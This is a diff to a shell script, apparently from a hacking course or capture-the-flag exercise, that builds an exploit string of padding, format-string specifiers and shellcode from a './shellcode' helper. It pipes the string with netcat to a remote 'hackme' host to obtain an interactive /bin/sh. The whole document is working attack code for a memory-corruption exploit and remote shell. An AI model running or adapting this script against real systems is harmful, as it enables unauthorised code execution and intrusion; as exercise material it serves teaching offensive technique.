@@ -24,6 +24,10 @@ fi
 #                                                                           #
 #############################################################################
 
+
+# attackstr="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+# attackstr="%u %u %u "
+
 # Print some As (see the $1 in the argument to seq!)
 for i in $(seq 1 $1); 
 do 
@@ -37,10 +41,10 @@ fi
 
 # third argument is padding for our address
 if ! [ "$3" = "" ]; then
-    for i in $(seq 0 $3); do
-        attackstr="\0${attackstr}"
-    done
-        # attackstr="$(./shellcode list $3)${attackstr}"
+        attackstr="$(./shellcode list $3)${attackstr}"
+    # for i in $(seq 0 $3); do
+    #    attackstr="A${attackstr}"
+    # done
 fi
 
 
@@ -54,5 +58,5 @@ echo "Attackstring is $(echo -n $attackstr | wc -c) bytes" >&2  # print to stder
 # echo $attackstr | nc hackme.rded.nl 57065 # Comment me out if you want to run the /bin/ls shell code (./shellcode list)
 
 # Uncomment if you want to run the /bin/sh shell code (./shellcode shell)
-(echo $attackstr; cat -) | nc hackme.rded.nl 33369
+(echo $attackstr; cat -) | nc hackme.rded.nl 52624
 ## This composed command allows stdin to remain open, which would otherwise have been closed by the EOF sent by echo.
